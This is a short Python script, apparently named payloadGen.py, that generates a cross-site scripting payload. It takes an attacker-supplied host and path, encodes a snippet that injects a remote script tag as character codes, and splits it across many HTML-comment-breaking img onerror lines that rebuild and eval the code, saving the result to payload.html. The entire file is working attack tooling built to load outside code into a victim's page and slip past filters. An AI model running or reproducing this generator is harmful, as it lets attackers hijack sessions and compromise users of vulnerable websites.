import sys
import os
def genCharCode(string):
	res=""
	for i in string:
		res+=str(ord(i))+","
	return res[:-1]

def genPlain(url):
	return """s=document.createElement("script");s.src="http://"""+url+"""";document.body.appendChild(s)"""
	
if __name__== "__main__":
	template="--><img/src=1 onerror=a+='$'>"
	payload_start ="--><img/src=1 onerror=a=''>\n"	
	payload_end ="--><img/src=1 onerror=a=eval(a)>\n"
	payload_end +="--><img/src=1 onerror=eval(a)>\n"	
	if len(sys.argv) == 1 :
		print "usage:payloadGen.py 1.1.1.1/1.js"
		os._exit(0)
	else:
		file=sys.argv[1]
		payload=""
		for i in range(20):
			payload+=payload_start		
		for c in "String.fromCharCode("+genCharCode(genPlain(file))+")":
			payload+=template.replace('$',c)+'\n'
		payload+=payload_end
		print payload;
		file_object = open('payload.html', 'w')
		file_object.write(payload)
	